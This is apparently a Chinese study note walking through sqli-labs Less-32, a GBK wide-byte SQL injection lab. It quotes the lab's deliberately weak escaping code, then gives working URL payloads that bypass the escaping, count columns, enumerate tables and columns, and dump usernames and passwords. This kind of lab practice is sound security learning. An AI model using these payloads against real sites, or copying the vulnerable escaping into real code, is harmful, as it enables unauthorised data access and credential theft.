---
title: less32
url: https://www.yuque.com/u29002979/ep2zrx/bnzgag189k30mu7y
---

```bash
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    
    return $string;
}

mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

** 宽字节注入**，利用mysql使用GBK编码,将两个字符看作一个汉字的特性，
消除转义符号""，使单引号成功逃逸出来。get型宽字节**%df'**

<a name="Oqn0G"></a>

# 检查注入点

`1'`

> Hint: The Query String you input is escaped as : 1'
> The Query String you input in Hex becomes : 315c27

单引号**被转义**了。

`?id=1%df' and 1=1--+`

> Hint: The Query String you input is escaped as : 1�' and 1=1--
> The Query String you input in Hex becomes : 31df5c2720616e6420313d312d2d20

通过页面的回显发现确实存在宽字节注入

`输入?id=1 and 1=2，经过站长工具检验，3120616e6420313d32就是1 and 1=2的**16进制编码**` <a name="lZ5eZ"></a>

# 判断字段数

`?id=1%df' and 1=1 order by 4--+ `

> Unknown column '4' in 'order clause'
> 没有第4列

`?id=1%df' and 1=1 order by 3--+ `正常回显
有3列 <a name="nkL2x"></a>

# 找回显点

`?id=1%df' and 1=2 union select 1,2,3--+` &#x20;
显示2，3是回显点

<a name="Fo51J"></a>

# 爆破数据库名称

`?id=1%df' and 1=2 union select 1,2,database()--+` <a name="mfEoD"></a>

# 爆破数据库表名称

`?id=1%df' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+` <a name="UUMj0"></a>

# 爆破字段名称

因为'users'中单引号会被转义，因此采取十六进制代替'users'
**users的16进制是0x7573657273**
`?id=1%df' and 1=2 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+` <a name="uMeKf"></a>

# 爆破字段内容

`?id=1%df' and 1=2 union select 1,2,(select group_concat(username,0x7e,password) from users)--+`
